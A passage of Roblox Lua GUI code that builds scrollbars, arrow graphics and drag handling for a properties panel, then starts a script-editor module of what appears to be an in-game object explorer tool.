			Position = horizontal and UDim2.new(0,0,1,-ScrollBarWidth) or UDim2.new(1,-ScrollBarWidth,0,0);
			Size = horizontal and UDim2.new(1,0,0,ScrollBarWidth) or UDim2.new(0,ScrollBarWidth,1,0);
			BackgroundTransparency = 1;
			Create('ImageButton',{
				Name = "ScrollDown";
				Position = horizontal and UDim2.new(1,-ScrollBarWidth,0,0) or UDim2.new(0,0,1,-ScrollBarWidth);
				Size = UDim2.new(0, ScrollBarWidth, 0, ScrollBarWidth);
				BackgroundColor3 = ScrollStyles.Button;
				BorderColor3 = ScrollStyles.Border;
				--BorderSizePixel = 0;
			});
			Create('ImageButton',{
				Name = "ScrollUp";
				Size = UDim2.new(0, ScrollBarWidth, 0, ScrollBarWidth);
				BackgroundColor3 = ScrollStyles.Button;
				BorderColor3 = ScrollStyles.Border;
				--BorderSizePixel = 0;
			});
			Create('ImageButton',{
				Name = "ScrollBar";
				Size = horizontal and UDim2.new(1,-ScrollBarWidth*2,1,0) or UDim2.new(1,0,1,-ScrollBarWidth*2);
				Position = horizontal and UDim2.new(0,ScrollBarWidth,0,0) or UDim2.new(0,0,0,ScrollBarWidth);
				AutoButtonColor = false;
				BackgroundColor3 = Color3.new(0.94902, 0.94902, 0.94902);
				BorderColor3 = ScrollStyles.Border;
				--BorderSizePixel = 0;
				Create('ImageButton',{
					Name = "ScrollThumb";
					AutoButtonColor = false;
					Size = UDim2.new(0, ScrollBarWidth, 0, ScrollBarWidth);
					BackgroundColor3 = ScrollStyles.Button;
					BorderColor3 = ScrollStyles.Border;
					--BorderSizePixel = 0;
				});
			});
		})

		local graphicTemplate = Create('Frame',{
			Name="Graphic";
			BorderSizePixel = 0;
			BackgroundColor3 = ScrollStyles.Border;
		})
		local graphicSize = ScrollBarWidth/2

		local ScrollDownFrame = ScrollFrame.ScrollDown
			local ScrollDownGraphic = ArrowGraphic(graphicSize,horizontal and 'Right' or 'Down',true,graphicTemplate)
			ScrollDownGraphic.Position = UDim2.new(0.5,-graphicSize/2,0.5,-graphicSize/2)
			ScrollDownGraphic.Parent = ScrollDownFrame
		local ScrollUpFrame = ScrollFrame.ScrollUp
			local ScrollUpGraphic = ArrowGraphic(graphicSize,horizontal and 'Left' or 'Up',true,graphicTemplate)
			ScrollUpGraphic.Position = UDim2.new(0.5,-graphicSize/2,0.5,-graphicSize/2)
			ScrollUpGraphic.Parent = ScrollUpFrame
		local ScrollBarFrame = ScrollFrame.ScrollBar
		local ScrollThumbFrame = ScrollBarFrame.ScrollThumb
		do
			local size = ScrollBarWidth*3/8
			local Decal = GripGraphic(Vector2.new(size,size),horizontal and 'Vertical' or 'Horizontal',2,graphicTemplate)
			Decal.Position = UDim2.new(0.5,-size/2,0.5,-size/2)
			Decal.Parent = ScrollThumbFrame
		end

		local MouseDrag = Create('ImageButton',{
			Name = "MouseDrag";
			Position = UDim2.new(-0.25,0,-0.25,0);
			Size = UDim2.new(1.5,0,1.5,0);
			Transparency = 1;
			AutoButtonColor = false;
			Active = true;
			ZIndex = 10;
		})

		local Class = setmetatable({
			GUI = ScrollFrame;
			ScrollIndex = 0;
			VisibleSpace = 0;
			TotalSpace = 0;
			PageIncrement = 1;
		},mt)

		local UpdateScrollThumb
		if horizontal then
			function UpdateScrollThumb()
				ScrollThumbFrame.Size = UDim2.new(Class.VisibleSpace/Class.TotalSpace,0,0,ScrollBarWidth)
				if ScrollThumbFrame.AbsoluteSize.x < ScrollBarWidth then
					ScrollThumbFrame.Size = UDim2.new(0,ScrollBarWidth,0,ScrollBarWidth)
				end
				local barSize = ScrollBarFrame.AbsoluteSize.x
				ScrollThumbFrame.Position = UDim2.new(Class:GetScrollPercent()*(barSize - ScrollThumbFrame.AbsoluteSize.x)/barSize,0,0,0)
			end
		else
			function UpdateScrollThumb()
				ScrollThumbFrame.Size = UDim2.new(0,ScrollBarWidth,Class.VisibleSpace/Class.TotalSpace,0)
				if ScrollThumbFrame.AbsoluteSize.y < ScrollBarWidth then
					ScrollThumbFrame.Size = UDim2.new(0,ScrollBarWidth,0,ScrollBarWidth)
				end
				local barSize = ScrollBarFrame.AbsoluteSize.y
				ScrollThumbFrame.Position = UDim2.new(0,0,Class:GetScrollPercent()*(barSize - ScrollThumbFrame.AbsoluteSize.y)/barSize,0)
			end
		end

		local lastDown
		local lastUp
		local scrollStyle = {BackgroundColor3=ScrollStyles.Border,BackgroundTransparency=0}
		local scrollStyle_ds = {BackgroundColor3=ScrollStyles.Border,BackgroundTransparency=0.7}

		local function Update()
			local t = Class.TotalSpace
			local v = Class.VisibleSpace
			local s = Class.ScrollIndex
			if v <= t then
				if s > 0 then
					if s + v > t then
						Class.ScrollIndex = t - v
					end
				else
					Class.ScrollIndex = 0
				end
			else
				Class.ScrollIndex = 0
			end

			if Class.UpdateCallback then
				if Class.UpdateCallback(Class) == false then
					return
				end
			end

			local down = Class:CanScrollDown()
			local up = Class:CanScrollUp()
			if down ~= lastDown then
				lastDown = down
				ScrollDownFrame.Active = down
				ScrollDownFrame.AutoButtonColor = down
				local children = ScrollDownGraphic:GetChildren()
				local style = down and scrollStyle or scrollStyle_ds
				for i = 1,#children do
					Create(children[i],style)
				end
			end
			if up ~= lastUp then
				lastUp = up
				ScrollUpFrame.Active = up
				ScrollUpFrame.AutoButtonColor = up
				local children = ScrollUpGraphic:GetChildren()
				local style = up and scrollStyle or scrollStyle_ds
				for i = 1,#children do
					Create(children[i],style)
				end
			end
			ScrollThumbFrame.Visible = down or up
			UpdateScrollThumb()
		end
		Class.Update = Update

		SetZIndexOnChanged(ScrollFrame)

		local scrollEventID = 0
		ScrollDownFrame.MouseButton1Down:connect(function()
			scrollEventID = tick()
			local current = scrollEventID
			local up_con
			up_con = MouseDrag.MouseButton1Up:connect(function()
				scrollEventID = tick()
				MouseDrag.Parent = nil
				ResetButtonColor(ScrollDownFrame)
				up_con:disconnect(); drag = nil
			end)
			MouseDrag.Parent = GetScreen(ScrollFrame)
			Class:ScrollDown()
			wait(0.2) -- delay before auto scroll
			while scrollEventID == current do
				Class:ScrollDown()
				if not Class:CanScrollDown() then break end
				wait()
			end
		end)

		ScrollDownFrame.MouseButton1Up:connect(function()
			scrollEventID = tick()
		end)

		ScrollUpFrame.MouseButton1Down:connect(function()
			scrollEventID = tick()
			local current = scrollEventID
			local up_con
			up_con = MouseDrag.MouseButton1Up:connect(function()
				scrollEventID = tick()
				MouseDrag.Parent = nil
				ResetButtonColor(ScrollUpFrame)
				up_con:disconnect(); drag = nil
			end)
			MouseDrag.Parent = GetScreen(ScrollFrame)
			Class:ScrollUp()
			wait(0.2)
			while scrollEventID == current do
				Class:ScrollUp()
				if not Class:CanScrollUp() then break end
				wait()
			end
		end)

		ScrollUpFrame.MouseButton1Up:connect(function()
			scrollEventID = tick()
		end)

		if horizontal then
			ScrollBarFrame.MouseButton1Down:connect(function(x,y)
				scrollEventID = tick()
				local current = scrollEventID
				local up_con
				up_con = MouseDrag.MouseButton1Up:connect(function()
					scrollEventID = tick()
					MouseDrag.Parent = nil
					ResetButtonColor(ScrollUpFrame)
					up_con:disconnect(); drag = nil
				end)
				MouseDrag.Parent = GetScreen(ScrollFrame)
				if x > ScrollThumbFrame.AbsolutePosition.x then
					Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
					wait(0.2)
					while scrollEventID == current do
						if x < ScrollThumbFrame.AbsolutePosition.x + ScrollThumbFrame.AbsoluteSize.x then break end
						Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
						wait()
					end
				else
					Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
					wait(0.2)
					while scrollEventID == current do
						if x > ScrollThumbFrame.AbsolutePosition.x then break end
						Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
						wait()
					end
				end
			end)
		else
			ScrollBarFrame.MouseButton1Down:connect(function(x,y)
				scrollEventID = tick()
				local current = scrollEventID
				local up_con
				up_con = MouseDrag.MouseButton1Up:connect(function()
					scrollEventID = tick()
					MouseDrag.Parent = nil
					ResetButtonColor(ScrollUpFrame)
					up_con:disconnect(); drag = nil
				end)
				MouseDrag.Parent = GetScreen(ScrollFrame)
				if y > ScrollThumbFrame.AbsolutePosition.y then
					Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
					wait(0.2)
					while scrollEventID == current do
						if y < ScrollThumbFrame.AbsolutePosition.y + ScrollThumbFrame.AbsoluteSize.y then break end
						Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
						wait()
					end
				else
					Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
					wait(0.2)
					while scrollEventID == current do
						if y > ScrollThumbFrame.AbsolutePosition.y then break end
						Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
						wait()
					end
				end
			end)
		end

		if horizontal then
			ScrollThumbFrame.MouseButton1Down:connect(function(x,y)
				scrollEventID = tick()
				local mouse_offset = x - ScrollThumbFrame.AbsolutePosition.x
				local drag_con
				local up_con
				drag_con = MouseDrag.MouseMoved:connect(function(x,y)
					local bar_abs_pos = ScrollBarFrame.AbsolutePosition.x
					local bar_drag = ScrollBarFrame.AbsoluteSize.x - ScrollThumbFrame.AbsoluteSize.x
					local bar_abs_one = bar_abs_pos + bar_drag
					x = x - mouse_offset
					x = x < bar_abs_pos and bar_abs_pos or x > bar_abs_one and bar_abs_one or x
					x = x - bar_abs_pos
					Class:SetScrollPercent(x/(bar_drag))
				end)
				up_con = MouseDrag.MouseButton1Up:connect(function()
					scrollEventID = tick()
					MouseDrag.Parent = nil
					ResetButtonColor(ScrollThumbFrame)
					drag_con:disconnect(); drag_con = nil
					up_con:disconnect(); drag = nil
				end)
				MouseDrag.Parent = GetScreen(ScrollFrame)
			end)
		else
			ScrollThumbFrame.MouseButton1Down:connect(function(x,y)
				scrollEventID = tick()
				local mouse_offset = y - ScrollThumbFrame.AbsolutePosition.y
				local drag_con
				local up_con
				drag_con = MouseDrag.MouseMoved:connect(function(x,y)
					local bar_abs_pos = ScrollBarFrame.AbsolutePosition.y
					local bar_drag = ScrollBarFrame.AbsoluteSize.y - ScrollThumbFrame.AbsoluteSize.y
					local bar_abs_one = bar_abs_pos + bar_drag
					y = y - mouse_offset
					y = y < bar_abs_pos and bar_abs_pos or y > bar_abs_one and bar_abs_one or y
					y = y - bar_abs_pos
					Class:SetScrollPercent(y/(bar_drag))
				end)
				up_con = MouseDrag.MouseButton1Up:connect(function()
					scrollEventID = tick()
					MouseDrag.Parent = nil
					ResetButtonColor(ScrollThumbFrame)
					drag_con:disconnect(); drag_con = nil
					up_con:disconnect(); drag = nil
				end)
				MouseDrag.Parent = GetScreen(ScrollFrame)
			end)
		end

		function Class:Destroy()
			ScrollFrame:Destroy()
			MouseDrag:Destroy()
			for k in pairs(Class) do
				Class[k] = nil
			end
			setmetatable(Class,nil)
		end

		Update()

		return Class
	end
end

----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------

local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Size = UDim2.new(1, -1 * ScrollBarWidth, 1, 0)
MainFrame.Position = UDim2.new(0, 0, 0, 0)
MainFrame.BackgroundTransparency = 1
MainFrame.ClipsDescendants = true
MainFrame.Parent = PropertiesFrame

ContentFrame = Instance.new("Frame")
ContentFrame.Name = "ContentFrame"
ContentFrame.Size = UDim2.new(1, 0, 0, 0)
ContentFrame.BackgroundTransparency = 1
ContentFrame.Parent = MainFrame

scrollBar = ScrollBar(false)
scrollBar.PageIncrement = 1
Create(scrollBar.GUI,{
	Position = UDim2.new(1,-ScrollBarWidth,0,0);
	Size = UDim2.new(0,ScrollBarWidth,1,0);
	Parent = PropertiesFrame;
})

scrollBarH = ScrollBar(true)
scrollBarH.PageIncrement = ScrollBarWidth
Create(scrollBarH.GUI,{
	Position = UDim2.new(0,0,1,-ScrollBarWidth);
	Size = UDim2.new(1,-ScrollBarWidth,0,ScrollBarWidth);
	Visible = false;
	Parent = PropertiesFrame;
})

do
	local listEntries = {}
	local nameConnLookup = {}
	
	function scrollBar.UpdateCallback(self)
		scrollBar.TotalSpace = ContentFrame.AbsoluteSize.Y
		scrollBar.VisibleSpace = MainFrame.AbsoluteSize.Y
		ContentFrame.Position = UDim2.new(ContentFrame.Position.X.Scale,ContentFrame.Position.X.Offset,0,-1*scrollBar.ScrollIndex)
	end

	function scrollBarH.UpdateCallback(self)
		
	end

	MainFrame.Changed:connect(function(p)
		if p == 'AbsoluteSize' then
			scrollBarH.VisibleSpace = math.ceil(MainFrame.AbsoluteSize.x)
			scrollBarH:Update()
			scrollBar.VisibleSpace = math.ceil(MainFrame.AbsoluteSize.y)
			scrollBar:Update()
		end
	end)

	local wheelAmount = Row.Height
	PropertiesFrame.MouseWheelForward:connect(function()
		if scrollBar.VisibleSpace - 1 > wheelAmount then
			scrollBar:ScrollTo(scrollBar.ScrollIndex - wheelAmount)
		else
			scrollBar:ScrollTo(scrollBar.ScrollIndex - scrollBar.VisibleSpace)
		end
	end)
	PropertiesFrame.MouseWheelBackward:connect(function()
		if scrollBar.VisibleSpace - 1 > wheelAmount then
			scrollBar:ScrollTo(scrollBar.ScrollIndex + wheelAmount)
		else
			scrollBar:ScrollTo(scrollBar.ScrollIndex + scrollBar.VisibleSpace)
		end
	end)
end

scrollBar.VisibleSpace = math.ceil(MainFrame.AbsoluteSize.y)
scrollBar:Update()

showProperties(GetSelection())

bindSelectionChanged.Event:connect(function()
	showProperties(GetSelection())
end)

bindSetAwait.Event:connect(function(obj)
	if AwaitingObjectValue then
		AwaitingObjectValue = false
		local mySel = obj
		if mySel then
			pcall(function()
				Set(AwaitingObjectObj, AwaitingObjectProp, mySel)
			end)
		end
	end
end)

propertiesSearch.Changed:connect(function(prop)
	if prop == "Text" then
		showProperties(GetSelection())
	end
end)

bindGetApi.OnInvoke = function()
	return RbxApi
end

bindGetAwait.OnInvoke = function()
	return AwaitingObjectValue
end
end)
spawn(function()
	local top = D_E_X.ScriptEditor

local editorGrid = top:WaitForChild("EditorGrid")

local currentSource = ""

local currentEditor = {
	x = 0,
	y = 0
}

local userInput = game:GetService("UserInputService")
local mouse = game.Players.LocalPlayer:GetMouse()

local topBar = top:WaitForChild("TopBar")
local scriptBar = topBar:WaitForChild("ScriptBar")
local scriptBarLeft = topBar:WaitForChild("ScriptBarLeft")
local scriptBarRight = topBar:WaitForChild("ScriptBarRight")
local clipboardButton = topBar:WaitForChild("Clipboard")

local entryTemplate = topBar:WaitForChild("Entry")

local openEvent = top:WaitForChild("OpenScript")

local closeButton = top:WaitForChild("Close")

local memoryScripts = {}

local editingIndex = 0

-- Scrollbar

local ScrollBarWidth = 16

local ScrollStyles = {
	Background      = Color3.new(233/255, 233/255, 233/255);
	Border          = Color3.new(149/255, 149/255, 149/255);
	Selected        = Color3.new( 63/255, 119/255, 189/255);
	BorderSelected  = Color3.new( 55/255, 106/255, 167/255);
	Text            = Color3.new(  0/255,   0/255,   0/255);
	TextDisabled    = Color3.new(128/255, 128/255, 128/255);
	TextSelected    = Color3.new(255/255, 255/255, 255/255);
	Button          = Color3.new(221/255, 221/255, 221/255);
	ButtonBorder    = Color3.new(149/255, 149/255, 149/255);
	ButtonSelected  = Color3.new(255/255,   0/255,   0/255);
	Field           = Color3.new(255/255, 255/255, 255/255);
	FieldBorder     = Color3.new(191/255, 191/255, 191/255);
	TitleBackground = Color3.new(178/255, 178/255, 178/255);
}
do
	local ZIndexLock = {}
	function SetZIndex(object,z)
		if not ZIndexLock[object] then
			ZIndexLock[object] = true
			if object:IsA'GuiObject' then
				object.ZIndex = z
			end
			local children = object:GetChildren()
			for i = 1,#children do
				SetZIndex(children[i],z)
			end
			ZIndexLock[object] = nil
		end
	end
end
function SetZIndexOnChanged(object)
	return object.Changed:connect(function(p)
		if p == "ZIndex" then
			SetZIndex(object,object.ZIndex)
		end
	end)
end
function Create(ty,data)
	local obj
	if type(ty) == 'string' then
		obj = Instance.new(ty)
	else
		obj = ty
	end
	for k, v in pairs(data) do
		if type(k) == 'number' then
			v.Parent = obj
		else
			obj[k] = v
		end
	end
	return obj
end
-- returns the ascendant ScreenGui of an object
function GetScreen(screen)
	if screen == nil then return nil end
	while not screen:IsA("ScreenGui") do
		screen = screen.Parent
		if screen == nil then return nil end
	end
	return screen
end
-- AutoButtonColor doesn't always reset properly
function ResetButtonColor(button)
	local active = button.Active
	button.Active = not active
	button.Active = active
end

function ArrowGraphic(size,dir,scaled,template)
	local Frame = Create('Frame',{
		Name = "Arrow Graphic";
		BorderSizePixel = 0;
		Size = UDim2.new(0,size,0,size);
		Transparency = 1;
	})
	if not template then
		template = Instance.new("Frame")
		template.BorderSizePixel = 0
	end

	local transform
	if dir == nil or dir == 'Up' then
		function transform(p,s) return p,s end
	elseif dir == 'Down' then
		function transform(p,s) return UDim2.new(0,p.X.Offset,0,size-p.Y.Offset-1),s end
	elseif dir == 'Left' then
		function transform(p,s) return UDim2.new(0,p.Y.Offset,0,p.X.Offset),UDim2.new(0,s.Y.Offset,0,s.X.Offset) end
	elseif dir == 'Right' then
		function transform(p,s) return UDim2.new(0,size-p.Y.Offset-1,0,p.X.Offset),UDim2.new(0,s.Y.Offset,0,s.X.Offset) end
	end

	local scale
	if scaled then
		function scale(p,s) return UDim2.new(p.X.Offset/size,0,p.Y.Offset/size,0),UDim2.new(s.X.Offset/size,0,s.Y.Offset/size,0) end
	else
		function scale(p,s) return p,s end
	end

	local o = math.floor(size/4)
	if size%2 == 0 then
		local n = size/2-1
		for i = 0,n do
			local t = template:Clone()
			local p,s = scale(transform(
				UDim2.new(0,n-i,0,o+i),
				UDim2.new(0,(i+1)*2,0,1)
			))
			t.Position = p
			t.Size = s
			t.Parent = Frame
		end
	else
		local n = (size-1)/2
		for i = 0,n do
			local t = template:Clone()
			local p,s = scale(transform(
				UDim2.new(0,n-i,0,o+i),
				UDim2.new(0,i*2+1,0,1)
			))
			t.Position = p
			t.Size = s
			t.Parent = Frame
		end
	end
	if size%4 > 1 then
		local t = template:Clone()
		local p,s = scale(transform(
			UDim2.new(0,0,0,size-o-1),
			UDim2.new(0,size,0,1)
		))
		t.Position = p
		t.Size = s
		t.Parent = Frame
	end
	return Frame
end

function GripGraphic(size,dir,spacing,scaled,template)
	local Frame = Create('Frame',{
		Name = "Grip Graphic";
		BorderSizePixel = 0;
		Size = UDim2.new(0,size.x,0,size.y);
		Transparency = 1;
	})
	if not template then
		template = Instance.new("Frame")
		template.BorderSizePixel = 0
	end

	spacing = spacing or 2

	local scale
	if scaled then
		function scale(p) return UDim2.new(p.X.Offset/size.x,0,p.Y.Offset/size.y,0) end
	else
		function scale(p) return p end
	end

	if dir == 'Vertical' then
		for i=0,size.x-1,spacing do
			local t = template:Clone()
			t.Size = scale(UDim2.new(0,1,0,size.y))
			t.Position = scale(UDim2.new(0,i,0,0))
			t.Parent = Frame
		end
	elseif dir == nil or dir == 'Horizontal' then
		for i=0,size.y-1,spacing do
			local t = template:Clone()
			t.Size = scale(UDim2.new(0,size.x,0,1))
			t.Position = scale(UDim2.new(0,0,0,i))
			t.Parent = Frame
		end
	end

	return Frame
end

do
	local mt = {
		__index = {
			GetScrollPercent = function(self)
				return self.ScrollIndex/(self.TotalSpace-self.VisibleSpace)
			end;
			CanScrollDown = function(self)
				return self.ScrollIndex + self.VisibleSpace < self.TotalSpace
			end;
			CanScrollUp = function(self)
				return self.ScrollIndex > 0
			end;
			ScrollDown = function(self)
				self.ScrollIndex = self.ScrollIndex + self.PageIncrement
				self:Update()
			end;
			ScrollUp = function(self)
				self.ScrollIndex = self.ScrollIndex - self.PageIncrement
				self:Update()
			end;
			ScrollTo = function(self,index)
				self.ScrollIndex = index
				self:Update()
			end;
			SetScrollPercent = function(self,percent)
				self.ScrollIndex = math.floor((self.TotalSpace - self.VisibleSpace)*percent + 0.5)
				self:Update()
			end;
		};
	}
	mt.__index.CanScrollRight = mt.__index.CanScrollDown
	mt.__index.CanScrollLeft = mt.__index.CanScrollUp
	mt.__index.ScrollLeft = mt.__index.ScrollUp
	mt.__index.ScrollRight = mt.__index.ScrollDown

	function ScrollBar(horizontal)
		-- create row scroll bar
		local ScrollFrame = Create('Frame',{
			Name = "ScrollFrame";
			Position = horizontal and UDim2.new(0,0,1,-ScrollBarWidth) or UDim2.new(1,-ScrollBarWidth,0,0);
			Size = horizontal and UDim2.new(1,0,0,ScrollBarWidth) or UDim2.new(0,ScrollBarWidth,1,0);
			BackgroundTransparency = 1;
			Create('ImageButton',{
				Name = "ScrollDown";
				Position = horizontal and UDim2.new(1,-ScrollBarWidth,0,0) or UDim2.new(0,0,1,-ScrollBarWidth);
				Size = UDim2.new(0, ScrollBarWidth, 0, ScrollBarWidth);
				BackgroundColor3 = ScrollStyles.Button;
				BorderColor3 = ScrollStyles.Border;
				--BorderSizePixel = 0;
			});
			Create('ImageButton',{
				Name = "ScrollUp";
				Size = UDim2.new(0, ScrollBarWidth, 0, ScrollBarWidth);
				BackgroundColor3 = ScrollStyles.Button;
				BorderColor3 = ScrollStyles.Border;
				--BorderSizePixel = 0;
			});
			Create('ImageButton',{
				Name = "ScrollBar";
				Size = horizontal and UDim2.new(1,-ScrollBarWidth*2,1,0) or UDim2.new(1,0,1,-ScrollBarWidth*2);
				Position = horizontal and UDim2.new(0,ScrollBarWidth,0,0) or UDim2.new(0,0,0,ScrollBarWidth);
				AutoButtonColor = false;
				BackgroundColor3 = Color3.new(0.94902, 0.94902, 0.94902);
				BorderColor3 = ScrollStyles.Border;
				--BorderSizePixel = 0;
				Create('ImageButton',{
					Name = "ScrollThumb";
					AutoButtonColor = false;
					Size = UDim2.new(0, ScrollBarWidth, 0, ScrollBarWidth);
					BackgroundColor3 = ScrollStyles.Button;
					BorderColor3 = ScrollStyles.Border;
					--BorderSizePixel = 0;
				});
			});
		})

		local graphicTemplate = Create('Frame',{
			Name="Graphic";
			BorderSizePixel = 0;
			BackgroundColor3 = ScrollStyles.Border;
		})
		local graphicSize = ScrollBarWidth/2

		local ScrollDownFrame = ScrollFrame.ScrollDown
			local ScrollDownGraphic = ArrowGraphic(graphicSize,horizontal and 'Right' or 'Down',true,graphicTemplate)
			ScrollDownGraphic.Position = UDim2.new(0.5,-graphicSize/2,0.5,-graphicSize/2)
			ScrollDownGraphic.Parent = ScrollDownFrame
		local ScrollUpFrame = ScrollFrame.ScrollUp
			local ScrollUpGraphic = ArrowGraphic(graphicSize,horizontal and 'Left' or 'Up',true,graphicTemplate)
			ScrollUpGraphic.Position = UDim2.new(0.5,-graphicSize/2,0.5,-graphicSize/2)
			ScrollUpGraphic.Parent = ScrollUpFrame
		local ScrollBarFrame = ScrollFrame.ScrollBar
		local ScrollThumbFrame = ScrollBarFrame.ScrollThumb
		do
			local size = ScrollBarWidth*3/8
			local Decal = GripGraphic(Vector2.new(size,size),horizontal and 'Vertical' or 'Horizontal',2,graphicTemplate)
			Decal.Position = UDim2.new(0.5,-size/2,0.5,-size/2)
			Decal.Parent = ScrollThumbFrame
		end

		local MouseDrag = Create('ImageButton',{
			Name = "MouseDrag";
			Position = UDim2.new(-0.25,0,-0.25,0);
			Size = UDim2.new(1.5,0,1.5,0);
			Transparency = 1;
			AutoButtonColor = false;
			Active = true;
			ZIndex = 10;
		})

		local Class = setmetatable({
			GUI = ScrollFrame;
			ScrollIndex = 0;
			VisibleSpace = 0;
			TotalSpace = 0;
			PageIncrement = 1;
		},mt)

		local UpdateScrollThumb
		if horizontal then
			function UpdateScrollThumb()
				ScrollThumbFrame.Size = UDim2.new(Class.VisibleSpace/Class.TotalSpace,0,0,ScrollBarWidth)
				if ScrollThumbFrame.AbsoluteSize.x < ScrollBarWidth then
					ScrollThumbFrame.Size = UDim2.new(0,ScrollBarWidth,0,ScrollBarWidth)
				end
				local barSize = ScrollBarFrame.AbsoluteSize.x
				ScrollThumbFrame.Position = UDim2.new(Class:GetScrollPercent()*(barSize - ScrollThumbFrame.AbsoluteSize.x)/barSize,0,0,0)
			end
		else
			function UpdateScrollThumb()
				ScrollThumbFrame.Size = UDim2.new(0,ScrollBarWidth,Class.VisibleSpace/Class.TotalSpace,0)
				if ScrollThumbFrame.AbsoluteSize.y < ScrollBarWidth then
					ScrollThumbFrame.Size = UDim2.new(0,ScrollBarWidth,0,ScrollBarWidth)
				end
				local barSize = ScrollBarFrame.AbsoluteSize.y
				ScrollThumbFrame.Position = UDim2.new(0,0,Class:GetScrollPercent()*(barSize - ScrollThumbFrame.AbsoluteSize.y)/barSize,0)
			end
		end

		local lastDown
		local lastUp
		local scrollStyle = {BackgroundColor3=ScrollStyles.Border,BackgroundTransparency=0}
		local scrollStyle_ds = {BackgroundColor3=ScrollStyles.Border,BackgroundTransparency=0.7}

		local function Update()
			local t = Class.TotalSpace
			local v = Class.VisibleSpace
			local s = Class.ScrollIndex
			if v <= t then
				if s > 0 then
					if s + v > t then
						Class.ScrollIndex = t - v
					end
				else
					Class.ScrollIndex = 0
				end
			else
				Class.ScrollIndex = 0
			end

			if Class.UpdateCallback then
				if Class.UpdateCallback(Class) == false then
					return
				end
			end

			local down = Class:CanScrollDown()
			local up = Class:CanScrollUp()
			if down ~= lastDown then
				lastDown = down
				ScrollDownFrame.Active = down
				ScrollDownFrame.AutoButtonColor = down
				local children = ScrollDownGraphic:GetChildren()
				local style = down and scrollStyle or scrollStyle_ds
				for i = 1,#children do
					Create(children[i],style)
				end
			end
			if up ~= lastUp then
				lastUp = up
				ScrollUpFrame.Active = up
				ScrollUpFrame.AutoButtonColor = up
				local children = ScrollUpGraphic:GetChildren()
				local style = up and scrollStyle or scrollStyle_ds
				for i = 1,#children do
					Create(children[i],style)
				end
			end
			ScrollThumbFrame.Visible = down or up
			UpdateScrollThumb()
		end
		Class.Update = Update

		SetZIndexOnChanged(ScrollFrame)

		local scrollEventID = 0
		ScrollDownFrame.MouseButton1Down:connect(function()
			scrollEventID = tick()
			local current = scrollEventID
			local up_con
			up_con = MouseDrag.MouseButton1Up:connect(function()
				scrollEventID = tick()
				MouseDrag.Parent = nil
				ResetButtonColor(ScrollDownFrame)
				up_con:disconnect(); drag = nil
			end)
			MouseDrag.Parent = GetScreen(ScrollFrame)
			Class:ScrollDown()
			wait(0.2) -- delay before auto scroll
			while scrollEventID == current do
				Class:ScrollDown()
				if not Class:CanScrollDown() then break end
				wait()
			end
		end)

		ScrollDownFrame.MouseButton1Up:connect(function()
			scrollEventID = tick()
		end)

		ScrollUpFrame.MouseButton1Down:connect(function()
			scrollEventID = tick()
			local current = scrollEventID
			local up_con
			up_con = MouseDrag.MouseButton1Up:connect(function()
				scrollEventID = tick()
				MouseDrag.Parent = nil
				ResetButtonColor(ScrollUpFrame)
				up_con:disconnect(); drag = nil
			end)
			MouseDrag.Parent = GetScreen(ScrollFrame)
			Class:ScrollUp()
			wait(0.2)
			while scrollEventID == current do
				Class:ScrollUp()
				if not Class:CanScrollUp() then break end
				wait()
			end
		end)

		ScrollUpFrame.MouseButton1Up:connect(function()
			scrollEventID = tick()
		end)

		if horizontal then
			ScrollBarFrame.MouseButton1Down:connect(function(x,y)
				scrollEventID = tick()
				local current = scrollEventID
				local up_con
				up_con = MouseDrag.MouseButton1Up:connect(function()
					scrollEventID = tick()
					MouseDrag.Parent = nil
					ResetButtonColor(ScrollUpFrame)
					up_con:disconnect(); drag = nil
				end)
				MouseDrag.Parent = GetScreen(ScrollFrame)
				if x > ScrollThumbFrame.AbsolutePosition.x then
					Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
					wait(0.2)
					while scrollEventID == current do
						if x < ScrollThumbFrame.AbsolutePosition.x + ScrollThumbFrame.AbsoluteSize.x then break end
						Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
						wait()
					end
				else
					Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
					wait(0.2)
					while scrollEventID == current do
						if x > ScrollThumbFrame.AbsolutePosition.x then break end
						Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
						wait()
					end
				end
			end)
		else
			ScrollBarFrame.MouseButton1Down:connect(function(x,y)
				scrollEventID = tick()
				local current = scrollEventID
				local up_con
				up_con = MouseDrag.MouseButton1Up:connect(function()
					scrollEventID = tick()
					MouseDrag.Parent = nil
					ResetButtonColor(ScrollUpFrame)
					up_con:disconnect(); drag = nil
				end)
				MouseDrag.Parent = GetScreen(ScrollFrame)
				if y > ScrollThumbFrame.AbsolutePosition.y then
					Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
					wait(0.2)
					while scrollEventID == current do
						if y < ScrollThumbFrame.AbsolutePosition.y + ScrollThumbFrame.AbsoluteSize.y then break end
						Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
						wait()
					end
				else
					Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
					wait(0.2)
					while scrollEventID == current do
						if y > ScrollThumbFrame.AbsolutePosition.y then break end
						Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
						wait()
					end
				end
			end)
		end

		if horizontal then
			ScrollThumbFrame.MouseButton1Down:connect(function(x,y)
				scrollEventID = tick()
				local mouse_offset = x - ScrollThumbFrame.AbsolutePosition.x
				local drag_con
				local up_con
				drag_con = MouseDrag.MouseMoved:connect(function(x,y)
					local bar_abs_pos = ScrollBarFrame.AbsolutePosition.x
					local bar_drag = ScrollBarFrame.AbsoluteSize.x - ScrollThumbFrame.AbsoluteSize.x
					local bar_abs_one = bar_abs_pos + bar_drag
					x = x - mouse_offset
					x = x < bar_abs_pos and bar_abs_pos or x > bar_abs_one and bar_abs_one or x
					x = x - bar_abs_pos
					Class:SetScrollPercent(x/(bar_drag))
				end)
				up_con = MouseDrag.MouseButton1Up:connect(function()
					scrollEventID = tick()
